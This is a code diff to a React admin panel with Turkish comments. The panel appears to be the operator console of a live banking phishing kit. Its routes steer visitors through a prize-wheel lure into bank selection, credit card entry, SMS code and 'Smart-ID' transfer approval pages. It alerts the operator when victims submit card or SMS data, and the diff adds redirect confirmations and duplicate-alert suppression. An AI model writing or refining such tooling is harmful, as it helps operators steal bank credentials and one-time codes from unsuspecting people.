@@ -4,7 +4,7 @@ import { useCallback, useEffect, useState, useRef } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { DemoSession } from "@/types/session";
 import { pathToStep } from "@/lib/session-routes";
-import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
+import { playBeautifulNotification, showBeautifulToast, extractUserFormData } from "@/lib/notification";
 import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";
 import { LiveWatchModal } from "./LiveWatchModal";
 // Banka listesi (/banken) ekraninda kullanilan AYNI logo cozumleyiciyi import ediyoruz
@@ -932,6 +932,11 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
   }, [soundEnabled]);
 
   const playNotificationSound = useCallback((title: string = "Bildirim", desc?: string) => {
+    // Global AdminNotifier ile ayni olay icin cift bildirimi engelle
+    const w = window as any;
+    const now = Date.now();
+    if (w.__adminNotifyAt && now - w.__adminNotifyAt < 2000) return;
+    w.__adminNotifyAt = now;
     try {
       playBeautifulNotification();
       showBeautifulToast(title, desc);
@@ -939,6 +944,24 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       console.error("Audio error:", e);
     }
   }, []);
+
+  // Admin'in kendi yonlendirmesi icin ince onay seridi (SESSIZ - ses sadece kullanici form girdisinde calar)
+  const ROUTE_LABELS: Record<string, string> = {
+    win: "İsim & Profil", win2: "Zorlu", banken: "Banka Seçimi", banken2: "Banka Seçimi 2",
+    card: "Kredi Kartı", wait: "Bekleme", invalid_bank: "Hatalı Banka",
+    live_support: "Canlı Destek", congrats: "Tebrikler", sms: "SMS Onayı",
+    facebook: "Facebook", custom_question: "Özel Soru", code_entry: "Kod Girişi",
+    special_approval: "Özel Bildirim", generator1: "Generator 1", generator2: "Generator 2",
+    verify: "Doğrulama", wheel: "Çark",
+  };
+  const toastRedirect = (step: string, label?: string) => {
+    try {
+      const w = window as any;
+      w.__lastAdminActionAt = Date.now();
+      w.__adminNotifyAt = Date.now();
+      showBeautifulToast("Yönlendirildi", `Kullanıcı "${label || ROUTE_LABELS[step] || step}" sayfasına yönlendirildi.`);
+    } catch { /* ignore */ }
+  };
 
   const load = useCallback(async (pageArg?: number) => {
     if (!supabase) return;
@@ -1103,19 +1126,17 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           }
 
           if (soundEnabledRef.current && oldRow) {
-            const getSignificantData = (data: any) => {
-              if (!data) return {};
-              const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
-              return rest;
-            };
+            const w = window as any;
+            const isRecentAdminAction = w.__lastAdminActionAt && Date.now() - w.__lastAdminActionAt < 4000;
+            if (!isRecentAdminAction) {
+              const oldSignificant = extractUserFormData(oldRow.form_data);
+              const newSignificant = extractUserFormData(newRow.form_data);
+              const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
+              const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";
 
-            const oldSignificant = getSignificantData(oldRow.form_data);
-            const newSignificant = getSignificantData(newRow.form_data);
-            const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
-            const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";
-
-            if (isFormDataChanged || isUserSubmittedToWait) {
-              playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
+              if (isFormDataChanged || isUserSubmittedToWait) {
+                playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
+              }
             }
           }
 
@@ -1258,6 +1279,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         return;
       }
 
+      toastRedirect(targetStep);
       void load();
     } else if (action === "ban_ip") {
       const row = rowsRef.current.find(r => r.id === sessionId);
@@ -1331,6 +1353,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         } else if (!data) {
           // eslint-disable-next-line no-console
           console.warn("[admin] facebook yonlendirme 0 satir. pid:", facebookPromptPublicId, "uuid:", facebookPromptSessionId);
+        } else {
+          toastRedirect("facebook");
         }
         // BASARILI veya degilse: sadece load()
       } finally {
@@ -1402,6 +1426,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           },
         })
         .eq("id", sessionId);
+      toastRedirect("generator1");
       void load();
       return;
     }
@@ -1424,6 +1449,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       })
       .eq("id", smsPromptSessionId);
     setSmsPromptSessionId(null);
+    toastRedirect("sms");
     void load();
   }
 
@@ -1491,6 +1517,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       setApprovalPromptSessionId(null);
       setApprovalPromptType("");
       setApprovalCodeInput("");
+      toastRedirect("generator2");
       void load();
       return;
     }
@@ -1524,6 +1551,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       setApprovalCodeInput("");
       setTransferAmountInput("");
       setTransferMethodInput("smartid");
+      toastRedirect("special_approval", "Transfer Onayı");
       void load();
       return;
     }
@@ -1549,6 +1577,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     setApprovalPromptSessionId(null);
     setApprovalPromptType("");
     setApprovalCodeInput("");
+    toastRedirect("special_approval");
     void load();
   }
 
@@ -1579,6 +1608,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
     setQuestionPromptSessionId(null);
     setQuestionInput("");
+    toastRedirect("custom_question");
     void load();
   }
 
@@ -1995,6 +2025,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     setSpecialPromptSessionId(null);
     setSpecialMessage("");
     setSpecialImage(null);
+    toastRedirect("special_approval", "Özel Bildirim");
     void load();
   }
 
